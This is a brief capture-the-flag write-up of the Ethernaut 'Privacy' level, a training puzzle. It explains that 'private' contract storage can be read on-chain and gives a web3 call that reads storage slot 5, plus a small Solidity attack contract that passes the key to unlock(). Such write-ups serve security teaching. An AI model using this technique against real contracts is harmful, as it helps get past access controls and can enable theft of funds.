# Level 10: [Privacy](https://ethernaut.openzeppelin.com/level/0xcAac6e4994c2e21C5370528221c226D1076CfDAB)

## Level objectives:
- Unlock this contract to beat the level => set `locked = false` 
## Analysis
- To set `locked = false`, we must use the `unlock(bytes16 _data)` function as that's the only one changing state
of locked.
- The function reverts if we don't give it the correct data variable.
- `_data` is a private variable. It's in the slots 3-6. As some of the prev vars, are packed.
- We need `_data[2]` which is in the 5th slot.

## Code:
```js
web3.eth.getStorageAt("0x40a671cd5F6f7F8cda8Ce4486fC3fAbD82A5feA9", 5, "latest")
	.then(e => {
  	console.log(web3.eth.abi.decodeParameter('bytes32', e));
});

```

```sol
//SPDX-License-Identifier: MIT
pragma solidity ^0.8;

interface Privacy {
    function unlock(bytes16 _key) external;
}

contract AttackPrivacy {

    function attack(address _victim, bytes32 _data) public {
        Privacy victim = Privacy(_victim);
        victim.unlock(bytes16(_data));
    }
}
```
